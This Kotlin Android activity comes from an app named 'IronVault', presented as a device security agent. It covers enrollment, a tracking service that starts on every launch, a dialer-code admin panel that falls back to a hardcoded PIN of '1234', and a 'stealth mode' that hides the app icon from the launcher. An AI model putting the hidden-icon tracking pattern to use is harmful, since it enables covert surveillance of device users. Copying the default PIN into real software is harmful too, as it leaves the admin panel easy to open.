package com.ironvault

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.launch
import org.koin.android.ext.android.inject

class MainActivity : ComponentActivity() {

    private val prefs by lazy {
        getSharedPreferences("ironvault_prefs", Context.MODE_PRIVATE)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Keep screen on and prevent screenshots in panel
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_SECURE)

        val isEnrolled = prefs.getBoolean("enrolled", false)
        val accessMode = intent.getStringExtra("access_mode") ?: "normal"

        setContent {
            MaterialTheme {
                when {
                    accessMode == "admin_panel" -> AdminPanelScreen()
                    !isEnrolled -> EnrollmentScreen { onEnrollmentComplete() }
                    else -> {
                        // Normal launch shows lock screen or nothing (stealth mode)
                        val stealthMode = prefs.getBoolean("stealth_mode", false)
                        if (stealthMode) {
                            finish() // Hide — no UI in stealth mode
                        } else {
                            DeviceDashboard()
                        }
                    }
                }
            }
        }

        // Start tracking service
        TrackingService.startService(this)
    }

    private fun onEnrollmentComplete() {
        prefs.edit().putBoolean("enrolled", true).apply()
        TrackingService.startService(this)
        recreate()
    }
}

// ─── Enrollment Screen ────────────────────────────────────────────────────────

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun EnrollmentScreen(onComplete: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    var deviceName by remember { mutableStateOf("") }
    var ownerName by remember { mutableStateOf("") }
    var ownerEmail by remember { mutableStateOf("") }
    var department by remember { mutableStateOf("") }
    var isLoading by remember { mutableStateOf(false) }
    var errorMsg by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF1a1a2e))
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("IronVault", fontSize = 32.sp, fontWeight = FontWeight.Bold, color = Color.White)
        Text("Device Security Agent", fontSize = 14.sp, color = Color(0xFF888888))
        Spacer(Modifier.height(40.dp))

        listOf(
            "Device Name" to deviceName,
            "Owner Name" to ownerName,
            "Owner Email" to ownerEmail,
            "Department" to department,
        ).forEachIndexed { _, pair ->
            OutlinedTextField(
                value = pair.second,
                onValueChange = { v ->
                    when (pair.first) {
                        "Device Name" -> deviceName = v
                        "Owner Name" -> ownerName = v
                        "Owner Email" -> ownerEmail = v
                        "Department" -> department = v
                    }
                },
                label = { Text(pair.first, color = Color.Gray) },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = Color(0xFF4fc3f7),
                    unfocusedBorderColor = Color(0xFF444444),
                    focusedTextColor = Color.White,
                    unfocusedTextColor = Color.White,
                )
            )
            Spacer(Modifier.height(12.dp))
        }

        if (errorMsg.isNotEmpty()) {
            Text(errorMsg, color = Color.Red, fontSize = 12.sp)
            Spacer(Modifier.height(8.dp))
        }

        Button(
            onClick = {
                if (deviceName.isBlank() || ownerName.isBlank()) {
                    errorMsg = "Device name and owner name are required"
                    return@Button
                }
                scope.launch {
                    isLoading = true
                    try {
                        val repo = DeviceRepository(context)
                        repo.enrollDevice(deviceName, ownerName, ownerEmail, department)
                        onComplete()
                    } catch (e: Exception) {
                        errorMsg = "Enrollment failed: ${e.message}"
                    } finally {
                        isLoading = false
                    }
                }
            },
            enabled = !isLoading,
            modifier = Modifier.fillMaxWidth().height(52.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4fc3f7))
        ) {
            if (isLoading) CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp))
            else Text("Enroll Device", fontWeight = FontWeight.Bold)
        }
    }
}

// ─── Admin Panel (accessed via dialer code *#*#1234#*#*) ─────────────────────

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AdminPanelScreen() {
    val context = LocalContext.current
    val prefs = context.getSharedPreferences("ironvault_prefs", Context.MODE_PRIVATE)

    var authenticated by remember { mutableStateOf(false) }
    var pinInput by remember { mutableStateOf("") }
    var pinError by remember { mutableStateOf(false) }

    if (!authenticated) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFF0d0d1a))
                .padding(32.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text("Admin Access", fontSize = 24.sp, color = Color.White, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(24.dp))
            OutlinedTextField(
                value = pinInput,
                onValueChange = { pinInput = it },
                label = { Text("Admin PIN", color = Color.Gray) },
                visualTransformation = PasswordVisualTransformation(),
                isError = pinError,
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = Color(0xFF4fc3f7),
                    focusedTextColor = Color.White,
                    unfocusedTextColor = Color.White,
                )
            )
            if (pinError) Text("Wrong PIN", color = Color.Red, fontSize = 12.sp)
            Spacer(Modifier.height(16.dp))
            Button(onClick = {
                val savedPin = prefs.getString("admin_pin", "1234")
                if (pinInput == savedPin) authenticated = true
                else { pinError = true; pinInput = "" }
            }) { Text("Enter") }
        }
        return
    }

    AdminDashboard(context, prefs)
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AdminDashboard(context: Context, prefs: android.content.SharedPreferences) {
    val scope = rememberCoroutineScope()
    var stealthMode by remember { mutableStateOf(prefs.getBoolean("stealth_mode", false)) }
    var deviceId by remember { mutableStateOf(prefs.getString("device_id", "Not enrolled") ?: "") }
    var lastLocation by remember { mutableStateOf("Fetching...") }
    var simStatus by remember { mutableStateOf("Reading...") }
    var tamperLog by remember { mutableStateOf(listOf<String>()) }

    LaunchedEffect(Unit) {
        val db = IronVaultDatabase.getInstance(context)
        val locations = db.locationDao().getRecent(5)
        lastLocation = locations.firstOrNull()?.let {
            "%.5f, %.5f (${it.timestamp}ms ago)".format(it.latitude, it.longitude)
        } ?: "No location yet"

        val events = db.tamperLogDao().getRecent(20)
        tamperLog = events.map { "${it.event} — ${it.timestamp}" }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF0d0d1a))
            .padding(16.dp)
    ) {
        Text("IronVault Admin", fontSize = 22.sp, color = Color.White, fontWeight = FontWeight.Bold)
        Spacer(Modifier.height(4.dp))
        Text("Device ID: $deviceId", fontSize = 11.sp, color = Color.Gray)
        Spacer(Modifier.height(20.dp))

        // Status cards
        StatusCard("Last Location", lastLocation, Color(0xFF1e3a5f))
        Spacer(Modifier.height(8.dp))
        StatusCard("SIM Status", simStatus, Color(0xFF1a3a1a))
        Spacer(Modifier.height(16.dp))

        // Stealth mode toggle
        Row(
            verticalAlignment = Alignment.CenterVertically,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("Stealth Mode (hide from launcher)", color = Color.White, modifier = Modifier.weight(1f))
            Switch(
                checked = stealthMode,
                onCheckedChange = { v ->
                    stealthMode = v
                    prefs.edit().putBoolean("stealth_mode", v).apply()
                    if (v) StealthModeHelper.hideAppIcon(context)
                    else StealthModeHelper.showAppIcon(context)
                }
            )
        }

        Spacer(Modifier.height(16.dp))
        Text("Tamper Log", fontSize = 14.sp, color = Color.Gray, fontWeight = FontWeight.SemiBold)
        Spacer(Modifier.height(8.dp))

        LazyColumn(modifier = Modifier.weight(1f)) {
            items(tamperLog) { entry ->
                Text(entry, fontSize = 11.sp, color = Color(0xFFaaaaaa),
                    modifier = Modifier.padding(vertical = 2.dp))
            }
        }

        Spacer(Modifier.height(16.dp))
        Button(
            onClick = { TrackingService.startService(context) },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4fc3f7))
        ) { Text("Force Start Tracking Service") }
    }
}

@Composable
fun StatusCard(label: String, value: String, bgColor: Color) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = bgColor)
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Text(label, fontSize = 11.sp, color = Color.Gray)
            Text(value, fontSize = 13.sp, color = Color.White, fontWeight = FontWeight.Medium)
        }
    }
}

// ─── Device Dashboard (non-stealth mode) ─────────────────────────────────────

@Composable
fun DeviceDashboard() {
    val context = LocalContext.current
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF1a1a2e))
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("Device Security Active", color = Color.White, fontSize = 18.sp)
        Text("Protected by IronVault", color = Color.Gray, fontSize = 13.sp)
        Spacer(Modifier.height(24.dp))
        Icon(
            imageVector = androidx.compose.material.icons.Icons.Default.Security,
            contentDescription = null,
            tint = Color(0xFF4fc3f7),
            modifier = Modifier.size(64.dp)
        )
    }
}

// ─── Stealth Mode Helper ──────────────────────────────────────────────────────

object StealthModeHelper {
    fun hideAppIcon(context: Context) {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            android.content.ComponentName(context, MainActivity::class.java),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }

    fun showAppIcon(context: Context) {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            android.content.ComponentName(context, MainActivity::class.java),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }
}
